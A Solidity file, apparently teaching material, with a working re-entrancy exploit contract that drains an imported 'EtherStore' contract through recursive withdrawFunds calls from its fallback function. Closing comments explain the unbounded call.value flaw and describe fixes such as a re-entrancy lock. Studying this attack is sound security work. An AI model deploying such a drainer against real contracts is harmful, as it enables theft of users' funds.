pragma solidity ^0.4.24;
import"./46.sol";

/* Re-entrancy attach:
1. Attack.pwnEtherStore called EtherStore.withdrawFunds
2. EtherStore.withdrawFunds used "msg.sender.call.value(_weiToWithdraw)()" to transfer
3. Attack.fallback() was called and called called EtherStore.withdrawFunds again.
4. Re-entrancy attach happended!
*/
contract Attack{

	EtherStore public etherStore;

	//intialisetheetherStorevariablewiththecontractaddress
	constructor(address _etherStoreAddress)public{
		etherStore = EtherStore(_etherStoreAddress);
	}

	function pwnEtherStore()public payable{
		//attacktothenearestether
		require(msg.value >= 1 ether);

		//sendethtothedepositFunds()function
		etherStore.depositFunds.value(1 ether)();

		//startthemagic
		etherStore.withdrawFunds(1 ether); 
	}
	function collectEther()public{
		msg.sender.transfer(address(this).balance);
	}

	//fallbackfunction-wherethemagichappens
	function()payable public{
		if(address(etherStore).balance > 1 ether){
			etherStore.withdrawFunds(1 ether);
		}
	}
}

/*
Problem:
    msg.sender.call.value(_weiToWithdraw)() --> no gas limit

Solution:
    1. using .transfer & .send instread due to limited gas up to 2300 GAS
    2. using lock machanism:
        contract ReEntrancyGuard {
            bool internal locked;

            modifier noReentrant() {
                require(!locked, "No re-entrancy");
                locked = true;
                _;
                locked = false;
            }
        }
*/